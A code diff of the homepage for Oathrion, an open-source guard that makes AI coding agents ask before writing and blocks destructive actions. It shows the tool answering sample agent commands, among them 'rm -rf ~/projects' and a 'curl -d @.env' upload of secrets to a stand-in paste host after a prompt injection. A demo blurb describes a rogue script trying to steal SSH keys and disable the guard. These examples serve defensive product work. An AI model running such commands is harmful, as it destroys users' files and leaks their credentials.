@@ -1,325 +1,245 @@
 /**
- * La page d'accueil. Elle répond à : **qu'est-ce qu'Oathrion ?**
+ * La page d'accueil. Elle répond à : **qu'est-ce que ça fait, et qu'est-ce que je tape ?**
  *
- * L'ordre est celui d'une conversation avec quelqu'un qui n'a pas le temps : le problème,
- * la réponse montrée avant d'être expliquée, ce qui est mesurable, où ça se place, ce que
- * ça ne fait pas, puis les deux portes. Un visiteur peut s'arrêter à n'importe quelle
- * marche et repartir avec quelque chose de vrai.
+ * Refaite deux fois le 15 novembre 2026. La première version avait l'air d'une page générée :
+ * halo violet, titre en dégradé, badge au-dessus du titre, étiquettes en majuscules, rangée de
+ * chiffres. Une étude de 1 590 pages Show HN (Adrian Krebs, avril 2026) liste exactement ces
+ * motifs, et les développeurs qui arriveront le 17 les reconnaissent tout de suite.
+ *
+ * D'où cette page : le produit à la place des décors. Chaque texte en police mono est une
+ * sortie RÉELLE d'Oathrion, capturée le 15 novembre dans un dossier personnel d'essai
+ * (`stress-runs/accueil-1511/`) : le premier lancement, puis les verdicts du hook de Claude
+ * Code sur de vraies commandes. Si un message change dans le code, il change ici aussi.
  */
 
-import { Backdrop, CTA, Eyebrow, Reveal, Rise, Section } from "../components/Shell";
-import { HeroScene } from "../components/HeroScene";
+import { useState } from "react";
+import { Link } from "wouter";
 
-/*
- * LES CHIFFRES DE CETTE PAGE, ET CE QUI LES TIENT HONNÊTES.
- *
- * Ils sont MESURÉS, jamais estimés, et chacun vient d'une commande qu'un lecteur peut
- * relancer. `MEASURED_AT` nomme le commit et la date : sans cette référence, un chiffre
- * sur une page de vente est une affirmation invérifiable.
- *
- * ## Ce commentaire disait quelque chose de faux
- *
- * Il affirmait que les chiffres étaient « scellés dans le commit cité en bas de page ».
- * **Aucun commit n'était cité nulle part.** Sur la page dont l'objet entier est de montrer
- * des preuves vérifiables, c'était le défaut le plus gênant du lot — et il était invisible
- * parce que personne ne relit un commentaire.
- *
- * ## Trois chiffres avaient dérivé
- *
- * `npm test` annonçait 2 115 (réel : 2 634), `verify:prod-config` 38 (réel : 41), et
- * `e2e:multitenant` « 73 · 12 blocked ».
- *
- * Ce dernier mérite d'être raconté : les douze contrôles bloqués l'étaient parce que
- * `pg_dump` manquait sur la machine de release. Cette page le disait honnêtement. Mais
- * ces douze contrôles contenaient la purge de locataire — et cette purge ÉCHOUAIT, avec
- * une violation de clé étrangère, dès qu'un locataire avait des reçus. Le trou annoncé
- * sur cette page cachait un vrai défaut pendant tout ce temps.
- *
- * La leçon n'est pas « il fallait mieux annoncer le trou » : c'était déjà fait. C'est
- * qu'un contrôle qu'on ne peut pas exécuter ne protège de rien, et qu'un « bloqué »
- * toléré trop longtemps devient un « passé » dans la tête de tout le monde.
- */
-const MEASURED_AT = { commit: "8a49b30", on: "19 octobre 2026" };
+import { EVENTS, track } from "../lib/analytics";
+import "./home.css";
 
-const PROOF = [
-  { cmd: "npm test", score: "2 891 · 0 failed", ok: true, what: "The full suite: tenant isolation, deny-by-default, the receipt chain, currency handling, SSO. 81 skipped without a database — all PostgreSQL tests, run separately against a throwaway database (113 / 113, including a real database restart and a connection cut mid-transaction). Local tests, not a proof against real GitHub, Slack or Linear accounts." },
-  { cmd: "conformance", score: "CONFORME", ok: true, what: "21 core properties, 6 extended. The kit is MIT: run it against Oathrion, against a modified build, against a competitor." },
-  { cmd: "… --mutants", score: "23 · 25", ok: false, what: "Each property is deliberately broken to confirm the test fails. 23 are caught by the property they target, 1 is a declared limit, and 1 (a BLOCK made executable) is caught — but by a prerequisite property, so the kit counts it as a miss. Published as measured." },
-  { cmd: "verify:mcp", score: "37 · 37", ok: true, what: "The whole path against a tool server that shares no line of code with Oathrion." },
-  { cmd: "e2e:multitenant", score: "98 · 98", ok: true, what: "Two real tenants, full adversarial campaign, backup and restore included. Previously 12 checks could not run for want of pg_dump — and they were hiding a real defect in tenant erasure." },
-  { cmd: "chaos:postgres", score: "15 · 15", ok: true, what: "PostgreSQL genuinely stopped under a live instance: nothing authorized, no SQLite fallback opened, recovery without restart." },
-  { cmd: "verify:dr", score: "28 · 28", ok: true, what: "Restore onto another machine: the chain returns with the same head, a consumed grant stays consumed." },
-  { cmd: "verify:erasure", score: "20 · 20", ok: true, what: "Right to erasure against a real PostgreSQL: everything of one tenant, nothing of the other, and a record that survives the data." },
-  { cmd: "verify:prod-config", score: "41 · 41", ok: true, what: "Forty-one dangerous configurations refuse to boot, naming the variable responsible." },
+const REPO = "https://github.com/oathrion/oathrion";
+const COMMAND = "npx oathrion";
+
+function CopyCommand({ from }: { from: string }): JSX.Element {
+  const [copied, setCopied] = useState(false);
+  const copy = () => {
+    void navigator.clipboard?.writeText(COMMAND).then(() => {
+      setCopied(true);
+      track(EVENTS.codeCopy, { from, code: COMMAND });
+      setTimeout(() => setCopied(false), 1800);
+    });
+  };
+  return (
+    <button type="button" className="hm-cmd" onClick={copy} aria-label={`Copy ${COMMAND}`}>
+      <span className="hm-cmd__text"><span className="hm-dim">$</span> {COMMAND}</span>
+      <span className="hm-cmd__copy">{copied ? "copied" : "copy"}</span>
+    </button>
+  );
+}
+
+/** Le premier lancement, tel qu'il s'affiche (raccourci : les lignes de fin sont retirées). */
+function FirstRun(): JSX.Element {
+  return (
+    <figure className="hm-term" aria-label="Output of npx oathrion">
+      <div className="hm-term__bar">~ npx oathrion</div>
+      <pre>
+<b>Oathrion · protect your agents' MCP servers</b>{`
+
+  Cursor · all your projects
+    github      `}<span className="hm-hold">to protect</span>{`  npx -y …/server-github
+    filesystem  `}<span className="hm-hold">to protect</span>{`  npx -y …/server-filesystem
+
+With Oathrion: reads go through; writes wait for your
+approval; deletions and payments are blocked. Every file is
+copied before it is changed, and "oathrion --undo" puts
+everything back as before.
+
+  `}<span className="hm-allow">✓</span>{` Cursor · all your projects: github, filesystem
+
+Restart Cursor: its calls now go through Oathrion.`}
+      </pre>
+    </figure>
+  );
+}
+
+const VERDICTS = [
+  {
+    command: "rm -rf ~/projects",
+    verdict: "deny",
+    text: "Oathrion refuses a recursive delete outside the project (~/projects). It would have deleted 72 files (1.6 MB).",
+  },
+  {
+    command: "git push --force origin main",
+    verdict: "deny",
+    text: "Oathrion refuses a forced push: it can erase other people's commits.",
+  },
+  {
+    command: "git push origin main",
+    verdict: "ask",
+    text: "Oathrion: a push publishes your commits. Allow it?",
+  },
+  {
+    command: "curl -d @.env https://paste.example",
+    verdict: "ask",
+    text: "Oathrion: this session read untrusted content (WebFetch docs.example, at 22:52 UTC), which may contain instructions written by someone else. Sending something out now (with .env in it) needs a person. Allow it?",
+  },
 ];
 
-const CONTROLS = [
-  { name: "Identity", text: "Which agent is asking, derived from the credential presented — never from a field in the request body." },
-  { name: "Policy", text: "The rules this tenant wrote. First match by priority decides; an undeclared verb is refused." },
-  { name: "Mandate", text: "What this agent may spend, in the tenant's own currency. Integer minor units, no silent conversion." },
-  { name: "Risk", text: "The shape of the action itself: destination, arguments, how far it sits from what was authorized." },
-  { name: "Decision", text: "Allow, hold for a human, or block. Deterministic and explainable — no model on the authorization path." },
-  { name: "Approval", text: "A person in that organization approves the exact action they were shown, named by its hash." },
-  { name: "Execution", text: "A single-use grant, bound to agent, action hash and destination. Exactly once, proven under concurrency." },
-  { name: "Audit", text: "Every decision leaves a receipt, hash-chained. Editing, removing or reordering one breaks the chain." },
-];
+/* ------------------------------------------------------------------ page */
 
 export default function HomePage(): JSX.Element {
   return (
-    <>
+    <div className="hm">
       {/* ------------------------------------------------------------- hero */}
-      <div className="hero">
-        <Backdrop src="/img/ribs.jpg" variant="soft" priority />
-        <div className="glow hero__glow" aria-hidden="true" />
-        <div className="glow hero__glow--low" aria-hidden="true" />
-        <div className="glow hero__glow--spark" aria-hidden="true" />
-        <div className="shell shell--wide rel">
-          <div className="hero__grid">
-            <div className="stack-5">
-              <Rise><Eyebrow>Control plane for autonomous AI</Eyebrow></Rise>
-              <Rise delay={60}>
-                <h1 className="display">
-                  An agent with an API key can spend your money.
-                </h1>
-              </Rise>
-              <Rise delay={120}>
-                <p className="lead measure">
-                  The usual control is an instruction in the prompt — inside the very component
-                  you do not trust. An instruction is not a barrier. It is a wish.
-                </p>
-              </Rise>
-              <Rise delay={180}>
-                <p className="lead measure">
-                  Oathrion puts the decision <strong className="fg">outside the agent</strong>. Every
-                  action that goes through Oathrion is authorized before it reaches a tool, and
-                  every decision leaves a tamper-evident trace.
-                </p>
-              </Rise>
-              <Rise delay={240}>
-                <div className="row">
-                  <CTA href="/pilot" from="hero" large>Become a Founding Pilot</CTA>
-                  <CTA href="/waitlist" from="hero" variant="ghost" large>Join the waitlist</CTA>
-                </div>
-              </Rise>
-            </div>
+      <section className="hm-hero">
+        <div className="hm-wrap hm-hero__grid">
+          <div className="hm-hero__text">
+            <h1 className="hm-h1">Your coding agent asks before it breaks things.</h1>
+            <p className="hm-lead">
+              Oathrion sits between Claude Code or Cursor and everything they can touch. Reads
+              go through. Writes wait for your yes. A delete outside the project doesn't run.
+              Every action leaves a receipt that anyone can check.
+            </p>
+            <CopyCommand from="hero" />
+            <p className="hm-note">
+              Open source (Apache-2.0). Runs on your machine. No account, no telemetry.{" "}
+              <code>oathrion --undo</code> puts your config back.
+            </p>
+            <p className="hm-links">
+              <a href={REPO} rel="noreferrer" onClick={() => track(EVENTS.ctaClick, { from: "hero", to: REPO, label: "github" })}>GitHub</a>
+              <a href="#demo">Watch the 46 s demo</a>
+              <Link href="/developers">Docs</Link>
+            </p>
+          </div>
+          <FirstRun />
+        </div>
+      </section>
 
-            <Rise delay={300}>
-              <HeroScene />
-            </Rise>
+      {/* --------------------------------------------------------- verdicts */}
+      <section className="hm-section">
+        <div className="hm-wrap">
+          <h2 className="hm-h2">What your agent hears when it goes too far</h2>
+          <p className="hm-sub">
+            Four commands an agent really sends, and Oathrion's answer, word for word. Claude Code
+            shows it in the chat. Refused means the command never runs.
+          </p>
+          <ol className="hm-verdicts">
+            {VERDICTS.map((row) => (
+              <li key={row.command} className="hm-verdict">
+                <code className="hm-verdict__cmd"><span className="hm-dim">$</span> {row.command}</code>
+                <span className={`hm-tag hm-tag--${row.verdict}`}>{row.verdict === "deny" ? "refused" : "asks you"}</span>
+                <p className="hm-verdict__text">{row.text}</p>
+              </li>
+            ))}
+          </ol>
+        </div>
+      </section>
+
+      {/* ------------------------------------------------- where you say yes */}
+      <section className="hm-section">
+        <div className="hm-wrap hm-split">
+          <div>
+            <h2 className="hm-h2">You answer where you are</h2>
+            <p className="hm-sub">
+              In Claude Code's chat when it can ask. Otherwise a notification on your desktop,
+              with the mascot of the agent that's asking. Away from the computer, on your phone
+              through Telegram, with a sound you'll learn to recognise. Approve, and the agent has
+              the real answer 36 ms later.
+            </p>
+            <p className="hm-sub">
+              Tools a server marks destructive stay hidden until you allow them. Tool
+              descriptions are pinned on first run: if a server quietly changes one, that tool
+              disappears until you look.
+            </p>
+          </div>
+          <div className="hm-notif" role="img" aria-label="An approval notification">
+            <img src="/mascots/warden.png" alt="" width="64" height="64" loading="lazy" />
+            <div>
+              <div className="hm-notif__app">Oathrion · Claude Code</div>
+              <div className="hm-notif__title">create_issue on GitHub</div>
+              <div className="hm-notif__body">repo acme/api · "Fix login timeout"</div>
+              <div className="hm-notif__buttons"><span>Approve</span><span>Deny</span></div>
+            </div>
           </div>
         </div>
-      </div>
+      </section>
 
-      {/* ------------------------------------------------------- the problem */}
-      <Section line>
-        <div className="page-head">
-          <Reveal><Eyebrow>The gap</Eyebrow></Reveal>
-          <Reveal delay={60}>
-            <h2 className="h2 measure">Agents got the ability to act before anyone built the layer that says no.</h2>
-          </Reveal>
-        </div>
-        <div className="grid grid--3">
-          {[
-            { t: "The credential is the permission", d: "An agent holding an API key has every right that key has. Nothing between the model's output and the money." },
-            { t: "Prompt rules are advisory", d: "A system prompt asking an agent to stay under a limit is enforced by the thing being limited. Injection does not have to beat a barrier that is not there." },
-            { t: "Logs are written after", d: "Most systems record what happened. A control plane decides whether it may happen — and the difference only matters once." },
-          ].map((item, index) => (
-            <Reveal key={item.t} delay={index * 70} as="article">
-              <div className="card">
-                <h3 className="h3">{item.t}</h3>
-                <p className="small">{item.d}</p>
-              </div>
-            </Reveal>
-          ))}
-        </div>
-      </Section>
-
-      {/* ---------------------------------------------------- the eight gates */}
-      <Section line id="lifecycle" backdrop="/img/mesh.jpg" backdropVariant="wide">
-        <div className="page-head">
-          <Reveal><Eyebrow>Governance lifecycle</Eyebrow></Reveal>
-          <Reveal delay={60}><h2 className="h2 measure">Eight controls, in this order, on every action.</h2></Reveal>
-          <Reveal delay={120}>
-            <p className="lead">
-              Not a diagram drawn for a website. This is the order the authority plane actually
-              executes, and each step can refuse on its own.
-            </p>
-          </Reveal>
-        </div>
-
-        <ol className="lifecycle">
-          {CONTROLS.map((control, index) => (
-            <Reveal key={control.name} as="li" delay={index * 40}>
-              <div className="lifecycle__item">
-                <span className="lifecycle__n mono">{String(index + 1).padStart(2, "0")}</span>
-                <div className="stack-2">
-                  <h3 className="h3">{control.name}</h3>
-                  <p className="small">{control.text}</p>
-                </div>
-              </div>
-            </Reveal>
-          ))}
-        </ol>
-      </Section>
-
-      {/* -------------------------------------------------------- the proof */}
-      <Section line id="proof">
-        <div className="page-head">
-          <Reveal><Eyebrow>Verifiable, not declarative</Eyebrow></Reveal>
-          <Reveal delay={60}><h2 className="h2 measure">Do not believe us. Run them yourself.</h2></Reveal>
-          <Reveal delay={120}>
-            <p className="lead">
-              Every row is a command in the delivered repository, with the result it returned on
-              the release machine. You re-run them on your own PostgreSQL. For a control product,
-              this is the only kind of promise worth making.
-            </p>
-          </Reveal>
-        </div>
-
-        <Reveal>
-          <div className="table-wrap">
-            <table className="data">
-              <thead>
-                <tr><th scope="col">Command</th><th scope="col">Result</th><th scope="col">What it establishes</th></tr>
-              </thead>
-              <tbody>
-                {PROOF.map((row) => (
-                  <tr key={row.cmd}>
-                    <td className="mono">{row.cmd}</td>
-                    <td className={row.ok ? "ok mono" : "part mono"}>{row.score}</td>
-                    <td>{row.what}</td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
+      {/* ------------------------------------------------------------- demo */}
+      <section className="hm-section" id="demo">
+        <div className="hm-wrap">
+          <h2 className="hm-h2">46 seconds: a rogue script against the jail</h2>
+          <p className="hm-sub">
+            Read the secrets, read the SSH key, send them out, delete Oathrion, kill it. Six
+            tries, six failures. Linux only for now: the jail uses bubblewrap.
+          </p>
+          <div className="hm-video">
+            <video
+              controls
+              playsInline
+              preload="none"
+              poster="/media/oathrion-demo.jpg"
+              onPlay={() => track(EVENTS.ctaClick, { from: "demo", to: "video", label: "play" })}
+            >
+              <source src="/media/oathrion-demo.webm" type="video/webm" />
+            </video>
           </div>
-        </Reveal>
+        </div>
+      </section>
 
-        <Reveal delay={80}>
-          <div className="code" style={{ marginTop: "var(--s-5)" }}>
-            <div className="code__bar">
-              your machine · your PostgreSQL · measured at {MEASURED_AT.commit} on {MEASURED_AT.on}
-            </div>
+      {/* --------------------------------------------------------- receipts */}
+      <section className="hm-section">
+        <div className="hm-wrap hm-split">
+          <div>
+            <h2 className="hm-h2">Receipts you can hand to someone else</h2>
+            <p className="hm-sub">
+              Every call goes into a hash-chained log. Any one of them exports as a single HTML
+              file, signed with Ed25519, that opens in any browser and says Verified or Altered.
+              On GitHub, a small action checks that a branch written by an agent comes with its
+              receipts.
+            </p>
+          </div>
+          <figure className="hm-term hm-term--small" aria-label="Output of oathrion receipts verify">
+            <div className="hm-term__bar">~ oathrion receipts verify</div>
             <pre>
-{`git checkout ${MEASURED_AT.commit}
-npm ci `}<span className="k">&&</span>{` npm run build
-DATABASE_URL=postgres://… npm run verify:mcp
-npm run conformance -- --mutants
-npm run demo`}
+<span className="hm-allow">✓</span>{` local hub (all servers) — chain intact: 1 receipt(s)
+
+`}<span className="hm-dim">{`# after someone edits a receipt in the database`}</span>{`
+`}<span className="hm-block">✗</span>{` local hub (all servers) — BROKEN`}
             </pre>
-          </div>
-        </Reveal>
-      </Section>
-
-      {/* --------------------------------------------------------- two paths */}
-      <Section line>
-        <div className="page-head">
-          <Reveal><Eyebrow>Two shapes, two different promises</Eyebrow></Reveal>
-          <Reveal delay={60}><h2 className="h2 measure">In the path, or beside it.</h2></Reveal>
-          <Reveal delay={120}>
-            <p className="lead">
-              This distinction must never be blurred in a sales conversation. It decides what is
-              actually guaranteed.
-            </p>
-          </Reveal>
+          </figure>
         </div>
-
-        <div className="grid grid--2">
-          <Reveal as="article">
-            <div className="card">
-              <Eyebrow>Pattern A · the gateway</Eyebrow>
-              <h3 className="h3">Your tools are only reachable through Oathrion</h3>
-              <p className="small">
-                Your agent's MCP client points at Oathrion instead of your tool server. A
-                configuration change, not a code change.
-              </p>
-              <p className="small" style={{ borderTop: "1px solid var(--line)", paddingTop: "var(--s-3)" }}>
-                <strong className="fg">Guaranteed:</strong> Oathrion is physically in the path. An
-                action it refuses cannot happen, because the call never reaches the tool.
-              </p>
-            </div>
-          </Reveal>
-          <Reveal as="article" delay={80}>
-            <div className="card">
-              <Eyebrow>Pattern B · ask first</Eyebrow>
-              <h3 className="h3">Your code asks, then acts on the answer</h3>
-              <p className="small">
-                One call to <code className="mono">/api/evaluate</code>, directly or through an
-                SDK. Any language, any framework, no change to how your agent is built.
-              </p>
-              <p className="small" style={{ borderTop: "1px solid var(--line)", paddingTop: "var(--s-3)" }}>
-                <strong className="fg">Guaranteed:</strong> the decision is authoritative, recorded
-                and tamper-evident — but Oathrion cannot stop a program that ignores the answer it
-                was given.
-              </p>
-            </div>
-          </Reveal>
-        </div>
-      </Section>
+      </section>
 
       {/* ------------------------------------------------------------ limits */}
-      <Section line id="limits">
-        <div className="page-head">
-          <Reveal><Eyebrow mute>The page nobody writes</Eyebrow></Reveal>
-          <Reveal delay={60}><h2 className="h2 measure">What it does not do.</h2></Reveal>
-          <Reveal delay={120}>
-            <p className="lead">
-              A control product that hides its limits is not one. These are published in the
-              delivered documentation, not discovered in production.
-            </p>
-          </Reveal>
+      <section className="hm-section">
+        <div className="hm-wrap hm-narrow">
+          <h2 className="hm-h2">What it doesn't do</h2>
+          <ul className="hm-list">
+            <li>It only sees what goes through it. An agent with its own unrestricted shell can still act around it.</li>
+            <li>It doesn't detect prompt injection. It limits what an injected agent can do afterwards.</li>
+            <li>It's a preview. Tested with Claude Code 2.1 and Cursor. Claude Desktop isn't verified yet.</li>
+            <li>The jail and the agent watch are Linux only. On macOS and Windows you get approvals, refusals and receipts.</li>
+          </ul>
+          <p className="hm-sub"><Link href="/security">The full list, and what is guaranteed</Link></p>
         </div>
+      </section>
 
-        <div className="grid grid--2">
-          {[
-            { t: "It only governs what goes through it", d: "Actions sent through its connectors (GitHub, Slack, Linear), its MCP gateway, its API or its firewall. An agent that keeps its own credentials and calls a service directly is neither seen nor stopped. The built-in payment and e-mail tools are simulated." },
-            { t: "It does not solve prompt injection", d: "No authorization layer does. It bounds the damage: a ceiling holds whether or not the agent was fooled." },
-            { t: "The trace is tamper-evident, and that is less than it sounds", d: "It proves it has not been modified. It proves nothing to a third party: no signature, no external anchor, so someone with database write access and the code can recompute a consistent chain." },
-            { t: "No SLO, and no distant numbers", d: "One instance reaches roughly 90–190 requests per second. No measurement exists beyond a single machine, so no tail latency is published." },
-            { t: "No risk score", d: "Decisions are deterministic and explainable to an auditor. No model sits on the authorization path." },
-            { t: "No billing, no SAML, no erasure of one person", d: "Tenant export and permanent tenant purge exist, and SSO speaks OIDC. Erasing one person's data inside a tenant does not exist: if you must honour that right, it belongs in the contract today." },
-          ].map((item, index) => (
-            <Reveal key={item.t} as="article" delay={index * 50}>
-              <div className="limit-item">
-                <h3 className="h3">{item.t}</h3>
-                <p className="small">{item.d}</p>
-              </div>
-            </Reveal>
-          ))}
+      {/* ------------------------------------------------------------- who */}
+      <section className="hm-section">
+        <div className="hm-wrap hm-narrow">
+          <h2 className="hm-h2">Who makes it</h2>
+          <p className="hm-sub">
+            Oathrion is built by Abdoulaye Diallo, in Dakar. It's early. If it gets in your way or
+            misses something, open an issue on <a href={REPO} rel="noreferrer">GitHub</a> or write
+            to <a href="mailto:contact@oathrion.com">contact@oathrion.com</a>. Teams running
+            agents on real tools can join the <Link href="/pilot">founding pilot</Link>.
+          </p>
+          <div className="hm-end">
+            <CopyCommand from="end" />
+          </div>
         </div>
-      </Section>
-
-      {/* ------------------------------------------------------------ doors */}
-      <Section line id="join" backdrop="/img/sphere.jpg" backdropVariant="left">
-        <div className="grid grid--2 doors">
-          <Reveal as="article">
-            <div className="door door--now">
-              <Eyebrow>Now · five places</Eyebrow>
-              <h2 className="h2">Founding Pilot</h2>
-              <p className="body">
-                We set the rules up with you and you connect your tools behind the gateway. Not
-                manufactured scarcity: nobody does that work for fifty companies at once.
-              </p>
-              <div className="row" style={{ marginTop: "var(--s-4)" }}>
-                <CTA href="/pilot" from="home-doors" large>Apply to the pilot</CTA>
-              </div>
-            </div>
-          </Reveal>
-          <Reveal as="article" delay={80}>
-            <div className="door">
-              <Eyebrow mute>At launch · no limit</Eyebrow>
-              <h2 className="h2">Global waitlist</h2>
-              <p className="body">
-                For the commercial release, open to everyone, everywhere. One message when it
-                opens — no newsletter, no follow-ups in between.
-              </p>
-              <div className="row" style={{ marginTop: "var(--s-4)" }}>
-                <CTA href="/waitlist" from="home-doors" variant="ghost" large>Join the waitlist</CTA>
-              </div>
-            </div>
-          </Reveal>
-        </div>
-      </Section>
-    </>
+      </section>
+    </div>
   );
 }
